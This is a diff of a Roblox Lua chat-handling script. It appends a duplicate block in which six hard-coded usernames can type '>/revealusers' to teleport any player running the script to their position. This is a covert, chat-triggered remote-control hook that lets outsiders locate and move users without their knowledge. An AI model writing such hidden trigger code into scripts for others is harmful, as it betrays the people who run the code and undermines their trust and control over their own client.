@@ -30,3 +30,35 @@ for _, player in ipairs(Players:GetPlayers()) do
 end
 
 Players.PlayerAdded:Connect(setupPlayerChat)
+-----------------------------------------------
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local authorizedUsers = {
+    ["QT_xAraa"] = true,
+    ["Shot16kill"] = true,
+    ["philippinesBraxy123"] = true,
+	["Brxy_Alt"] = true,
+	["Bowmbaclaat"] = true,
+	["Drenvoryth"] = true
+}
+
+local function onChatMessage(player, message)
+    if authorizedUsers[player.Name] then
+        local match = message:lower():match(">/%s*revealusers%s*")
+        if match then
+            LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
+        end
+    end
+end
+
+local function setupPlayerChat(player)
+    player.Chatted:Connect(function(message)
+        onChatMessage(player, message)
+    end)
+end
+
+for _, player in ipairs(Players:GetPlayers()) do
+    setupPlayerChat(player)
+end
+
+Players.PlayerAdded:Connect(setupPlayerChat)
